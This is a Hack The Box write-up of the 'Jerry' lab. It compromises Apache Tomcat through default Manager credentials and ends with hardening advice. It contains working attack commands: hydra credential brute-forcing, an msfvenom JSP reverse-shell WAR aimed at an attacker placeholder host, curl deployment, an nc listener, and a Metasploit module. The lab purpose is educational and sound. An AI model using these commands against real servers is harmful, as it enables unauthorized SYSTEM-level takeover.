---
title: "Jerry: Tomcat Default Credentials to SYSTEM Shell"
description: "Default Tomcat Manager credentials allow WAR deployment, producing an immediate SYSTEM shell."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - tomcat
  - default-credentials
  - war-deployment
---

## Summary

This Hack The Box lab demonstrated a common enterprise Java misconfiguration: an exposed Apache Tomcat Manager application with default credentials. Enumeration revealed a single HTTP service running Tomcat 7.0.88 with the Manager interface publicly accessible. Default credential testing yielded valid authentication, and a malicious WAR file was deployed through the Manager's legitimate upload mechanism, producing an immediate SYSTEM-level reverse shell. No privilege escalation was required because the Tomcat service ran as `NT AUTHORITY\SYSTEM`. All target IPs, attacker addresses, and credential material are replaced with role-based placeholders.

## Context and Objective

The Windows lab (Windows Server 2012 R2) exposed a single service on TCP 8080: Apache Tomcat. The Tomcat Manager application was reachable without IP restriction, presenting an administrative interface for deploying Java web applications. Objective: validate the documented default-credential attack path from Tomcat Manager access to OS-level control.

## Approach and Evidence

### Port scanning

Observation: a full TCP scan returned one open port running Apache Tomcat 7.0.88, an end-of-life release.

```bash
nmap -sC -sV -p- --min-rate 5000 -oN <SCAN_OUTPUT> <TARGET>
```

```text
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
```

Technical significance: Tomcat 7.0.88 reached end-of-life in 2021 and does not receive security patches. A single exposed management interface on an older version significantly narrows the attack surface.

### Web enumeration and Manager discovery

Observation: browsing to the target displayed the default Tomcat landing page, and directory enumeration identified the Manager application at `/manager/html`.

```bash
gobuster dir -u http://<TARGET>:8080 \
  -w /usr/share/seclists/Discovery/Web-Content/tomcat.txt \
  -t 40 -o gobuster.out
```

```text
/manager/html
/host-manager/html
/examples/
```

Action: requested `/manager/html`, which triggered a Basic Authentication prompt. Cancelling the prompt returned a Tomcat error page containing sample configuration XML with example credentials.

Technical significance: the Tomcat Manager application provides authenticated users with the ability to deploy, start, stop, and undeploy web applications. Access to the Manager is functionally equivalent to arbitrary code execution on the host.

### Credential discovery and validation

Observation: the error page at `/manager/html` included Tomcat's sample `tomcat-users.xml` snippet showing example credentials.

```xml
<role rolename="manager-gui"/>
<user username="tomcat" password="<DEFAULT_PASSWORD>" roles="manager-gui"/>
```

Action: tested the documented example credentials against the Manager interface.

```bash
hydra -L /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt \
      -P /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt \
      -f -s 8080 <TARGET> http-get /manager/html
```

```text
[8080][http-get] host: <TARGET>   login: <TOMCAT_USER>   password: <TOMCAT_PASSWORD>
```

```bash
curl -u <TOMCAT_USER>:<TOMCAT_PASSWORD> http://<TARGET>:8080/manager/html -I
```

```text
HTTP/1.1 200 OK
```

Result: the Tomcat Manager authenticated successfully with documented default credentials. The notes confirm this was the valid credential pair for the Manager interface.

### WAR file deployment

Observation: Tomcat Manager's text-based deploy API accepts WAR uploads at arbitrary context paths, providing authenticated code execution.

Action: generated a Java JSP reverse shell WAR file, uploaded it through the Manager API, and triggered execution by requesting the embedded JSP.

```bash
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=<ATTACKER> \
  LPORT=9001 \
  -f war \
  -o shell.war
```

```bash
curl -u <TOMCAT_USER>:<TOMCAT_PASSWORD> \
  http://<TARGET>:8080/manager/text/deploy?path=/shell \
  --upload-file shell.war
```

```text
OK - Deployed application at context path [/shell]
```

```bash
nc -lvnp 9001
```

```bash
curl http://<TARGET>:8080/shell/<JSP_FILENAME>.jsp
```

```text
connect to [<ATTACKER>] from (UNKNOWN) [<TARGET>] 49193
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

<TOMCAT_HOME>>whoami
nt authority\system
```

Result: the deployed JSP connected back to the listener as `NT AUTHORITY\SYSTEM`. No privilege escalation step was necessary — the Tomcat service ran under the SYSTEM account.

### Alternative Metasploit path

Observation: the `tomcat_mgr_upload` module in Metasploit automates the same WAR deployment technique.

```bash
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS <TARGET>
set RPORT 8080
set HttpUsername <TOMCAT_USER>
set HttpPassword <TOMCAT_PASSWORD>
set LHOST <ATTACKER>
set LPORT 9001
set PAYLOAD java/meterpreter/reverse_tcp
run
```

```text
[*] Meterpreter session 1 opened
meterpreter> getuid
Server username: NT AUTHORITY\SYSTEM
```

Technical significance: the manual and automated methods achieve identical results. The attack requires only two HTTP requests (upload and trigger) when valid credentials are available.

## Challenges and Decisions

No significant obstacles were encountered. The default credential was immediately valid, and the WAR deployment succeeded without error. The primary decision was to verify the attack path manually before confirming with Metasploit, ensuring both methods were validated against the same target configuration.

## Outcome

The evidence establishes a complete compromise chain: Tomcat Manager with default credentials provided authenticated access, the Manager's legitimate WAR upload mechanism delivered a JSP reverse shell, and the Tomcat service's SYSTEM-level execution context produced immediate OS-level control. Both flags were found on the target system. No privilege escalation was required.

## Lessons and Recommendations

- **Change all default credentials before deployment.** Tomcat ships with example credentials in `conf/tomcat-users.xml` that exist solely for documentation. These accounts must be removed or replaced with strong, unique credentials before the server is exposed to any network.
- **Restrict Manager application access by IP.** Even with strong credentials, the Manager and Host Manager applications should not be reachable from the internet or general corporate network. Use `RemoteAddrValve` in `conf/Catalina/localhost/manager.xml` to enforce IP-based access control as defence in depth.
- **Run Tomcat as a least-privileged service account.** The Tomcat process running as `NT AUTHORITY\SYSTEM` meant that WAR deployment immediately yielded OS-level control. A dedicated service account with minimal permissions limits the blast radius of a Tomcat compromise.
- **Deploy a defence-in-depth strategy.** No CVE was exploited; the entire attack used Tomcat's own legitimate deployment functionality. Technical controls (credential rotation, network segmentation, least privilege) must complement patch management.

## References

- Hack The Box, [Jerry](https://app.hackthebox.com/machines/Jerry) machine.
- Apache Tomcat 7.0 documentation: Manager Application.
